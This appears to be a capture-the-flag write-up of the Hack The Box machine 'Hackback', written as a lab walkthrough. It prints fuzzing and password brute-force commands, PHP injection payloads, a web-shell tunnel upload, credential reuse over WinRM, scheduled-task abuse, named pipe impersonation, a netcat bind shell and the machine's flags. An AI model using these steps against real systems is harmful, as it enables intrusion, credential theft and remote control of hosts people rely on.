**Skills Required**
● Enumeration
● Reverse Engineering
● Modifying exploit code
**Skills Learned**
● ASPX tunneling
● Named pipe impersonation
● Exploiting arbitrary writes


Initially, we began by enumerating port 80(HTTP)

``` bash
❯ whatweb 10.10.10.128
http://10.10.10.128 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.128], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

After identifying the website with just an image, we planned to fuzz it using tools like wfuzz or gobuster to discover hidden routes or subdomains on the server.
Before doing that, I saved the domain name in my hosts file.

``` bash
wfuzz -c --hc=404 --hh=614 -t 200 -w /wordlist -H "Host: FUZZ.hackback.htb" http://hackback.htb

```

 wfuzz found an "admin" subdomain,  which turned out to be a login panel. However, it didn't seem to work, so I checked the page source and found a route "js/.js"
 Using wfuzz again, I fuzzed files for that path:
``` bash
wfuzz -c --hc=404 -t 200 -w /wordlist http://admin.hackback.htb/js/FUZZ.js
```

wfuzz discovered a "private.js" file, which, when checked, appeared to contain source code encoded with a a rot13 cipher. I decoded it with rot13.com site
After decoding, I uses the firefox console to analyze some variables

``` bash
#paste the javascript code in the console, call the variables "x,z,h,y...."
x  "Secure Login Bypass"  
z  "Remember the secret path is"  
h  "2bb6916122f1da34dcd916421e531578"  
y  "Just in case I loose access to the admin panel"  
t  "?action=(show,list,exec,init)"  
s  "&site=(twitter,paypal,facebook,hackthebox)"  
i  "&password=********"  
k  "&session="  
w  "Nothing more to say"
```

It's a message that give a server path and some hints, so I checked this path and used wfuuz again to fuzz files in this path
``` bash
	wfuzz -c --hc=404 -t 200 -w /wordlist http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ.php
```

wfuzz found "webadmin.php" and in the previous message had some parameters that I used

``` bash
curl -s "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=test&session="

```

I then used wfuzz once more to attempt to brute force the password parameter

``` bash
wfuzz -c --hc=404 --hh=17,0 -t 200 -w /passwords/xato-net10000.txt "http://admin.hackback.htb/2bb9..../webadmin.php?action=list&site=hackthebox&password=FUZZ&session="
```

wfuzz found the password "12345678" , which I used 
``` bash
curl -s "http://admin.hackback.htb/2bb9..../webadmin.php?action=list&site=hackthebox&password=12345678&session="

```

I discovered a .log file and needed to find a way to view it.

I checked another port 64831, which was https and hosted a gophish applicaiton that seemed to contain Email templates for phish hackthebox and another sites.
I found the phishing url (https://www.hackthebox.htb), and saved it in my hosts file  as (www.hackthebox.htb).

After checking the false hackthebox site,  I exploit a vulnerability in the hack the box login panel, allowing me to inject commands. and I used the session ID from the login panel and used it with the parameter I found earlier

``` bash
curl -s "http://admin.hackback.htb/2bb9..../webadmin.php?action=show&site=hackthebox&password=12345678&session=session"

```

This allowed me to view the logs generetared from my ip.

By trying some payloads in the login panel form, I noticed that I could execute some php commands. I atempted to enumerate internal server information

``` bash
#on the login panel form
<?php print_r(scandir("../")); ?>
<?php echo file_get_contents("../web.config.old"); ?>

# on my machine
curl -s "http://admin.hackback.htb/2bb9..../webadmin.php?action=show&site=hackthebox&password=12345678&session=session"

userName="simple" 
password="ZonoProprioZomaro:-("
```

I obtained credentials from another file "web.conf.old" I saved the credentials

I continued by enumerating  port (6666), which appeared to be a command line application. With this, I could discover internal open ports.

``` bash
❯ curl -s http://hackback.htb:6666/netstat | grep "\"LocalPort\""
        "LocalPort":  64831,
        "LocalPort":  49670,
        "LocalPort":  49669,
        "LocalPort":  49668,
        "LocalPort":  49667,
        "LocalPort":  49666,
        "LocalPort":  49665,
        "LocalPort":  49664,
        "LocalPort":  47001,
        "LocalPort":  6666,
        "LocalPort":  5985,
        "LocalPort":  3389,
        "LocalPort":  445,
        "LocalPort":  135,
        "LocalPort":  80,
        "LocalPort":  49670,
        "LocalPort":  49669,
        "LocalPort":  49668,
        "LocalPort":  49667,
        "LocalPort":  49666,
        "LocalPort":  49665,
        "LocalPort":  49664,
        "LocalPort":  8080,
        "LocalPort":  6666,
        "LocalPort":  3389,
        "LocalPort":  139,
        "LocalPort":  135,
```
To use these ports, I exploit again the vulnerability in the hack the box login panel, allowing me to inject commands.

I attempted to inject a file in the server using "file_put_contets(;)",  and used the reGeorg tool https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx

``` bash
#Encode the "tunnel.aspx" code in base64
base64 -w 0 tunner.aspx; echo

#in the login panel
<?php file_put_contents("pwned.aspx", base64_decode("base64string")); ?>
#confirm 
❯ curl "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/pwned.aspx"
Georg says, 'All seems fine'%     

```

With the "tunnel.aspx" file on the server, I used the reGeorgsocksproxy.py tool

``` bash
python2 reGeorgSocksProxy.py -u http://admin.hackback.htb/2bb9..../pwned.aspx -p 1234

#edit prroxychains to use socks4 with the port 1234

```

Using proxychains, I could connect to the open ports of the victim machine with the help of reGeorgSOcksProxy
In this case I try to connect to port 5985 (winrm) and used the credentials  I found earlier to connect to the victim machine with the evil-winrm tool
``` bash
proxychains evil-winrm -i 127.0.0.1 -u 'simple' -p 'ZonoProprioZomaro:-('
```

This gave me access to the victim machine, Now I need to Escalate privileges

``` bash
*Evil-WinRM* PS C:\Users\simple\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

evil-winrm >  cd \util\scripts
*Evil-WinRM* PS C:\util\scripts> dir -Force
    Directory: C:\util\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/13/2018   2:54 PM                spool
-a----       12/21/2018   5:44 AM             84 backup.bat
-a----        9/26/2023   5:19 AM            402 batch.log
-a----       12/13/2018   2:56 PM             93 clean.ini
-a----        12/8/2018   9:17 AM           1232 dellog.ps1
-a----        9/26/2023   5:19 AM             35 log.txt
```

We found a .bat script  that seems to be a task that executes at time intervals, if I can put a malicious code .bat , this task will execute it. 
``` bash
*Evil-WinRM* PS C:\util\scripts> type dellog.bat
@echo off
rem =scheduled=
echo %DATE% %TIME% start bat >c:\util\scripts\batch.log
powershell.exe -exec bypass -f c:\util\scripts\dellog.ps1 >> c:\util\scripts\batch.log
for /F "usebackq" %%i in (`dir /b C:\util\scripts\spool\*.bat`) DO (
start /min C:\util\scripts\spool\%%i
timeout /T 5
del /q C:\util\scripts\spool\%%i
``` 
The .bat script uses another file, "clean.ini", and we have the manipulation privilege, so we can edit this file, 
``` bash
evil-winrm >  echo [Main] > clean.ini
evil-winrm >  echo LifeTime=100 >> clean.ini
evil-winrm >  echo LogFile=c:\util\scripts\kvzlx.txt >> clean.ini
evil-winrm >  echo Directory=c:\inetpub\logs\logfiles >> clean.ini
```

Now that we modified the clean.ini file, after some time, the .bat execute, and the clean.ini will also be executed. So, my kvzlx.txt file will be created

To know the user that executes that task, we can use the pipeserverimpersonate.ps1 script https://github.com/decoder-it/pipeserverimpersonate/blob/master/pipeserverimpersonate.ps1
``` bash
evil-winrm > cd C:\Windows\System32\spool\drivers\color\
evil-winrm > upload pipeserverimpersonate.ps1

#edit again the clean.ini file
evil-winrm >  echo [Main] > clean.ini
evil-winrm >  echo LifeTime=100 >> clean.ini
evil-winrm >  echo LogFile=\\.\pipe\dummypipe >> clean.ini
evil-winrm >  echo Directory=C:\inetpub\logs\logfiles >> clean.ini

#execute the impersonate script
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color\
C:\Windows\System32\spool\drivers\color\pipeserverimpersonate.ps1
Waiting for connection on namedpipe:dummypipe
user=HACKBACK\hacker
```

Using this, now we have the username (hacker), and we can impersonate this user.

``` bash
#create a .bat
C:\Windows\System32\spool\drivers\color\nc64.exe -lvp 4444 -e cmd.exe
#upload netcat and my .bat
evil-winrm > kvzlx.bat
evil-winrm > upload nc64.exe

#edit the pipeserverimpersonate.ps1 script to add the code that we want the user (hacker) to execute
copy C:\Windows\System32\spool\drivers\color\kvzlx.bat C:\util\scripts\spool\kvzlx.bat
evil-winrm > upload pipeserverimpersonate.ps1

#execute the impersonate script
evil-winrm > C:\Windows\System32\spool\drivers\color\pipeserverimpersonate.ps1
```

In this way I take advantage of the task that is executed at time intervals to get a bind shell.

Now, with proxychains and netcat, I can connect to the victim machine

``` bash
proxychains rlwrap nc 127.0.0.1 4444
``` 

Now we are as the user "hacker". Checking the services on the machine, I found something interesting : a "userlogger" service that records user activity.
``` bash
reg query HKLM\SYSTEM\CurrentControlSet\Services
UserLogger
``` 
Whit this user, we can have the privilege to start or stop the service.
We can give a name to the user log, and the log file has full privilege for every user. So, we can try to take advantage of this to get access to the root.txt flag
``` bash
evil-winrm > sc start userlogger C:\users\Administrator\desktop\root.txt:
#ADS (alternative data stream)
evil-winrm > more < C:\users\Administrator\desktop\root.txt:flag.txt
``` 

Root flag > 6d29b069d4de8eed1a2f1e62f7d02515
user flag > 922449f8e39c2fb4a8c0ff68d1e99cfe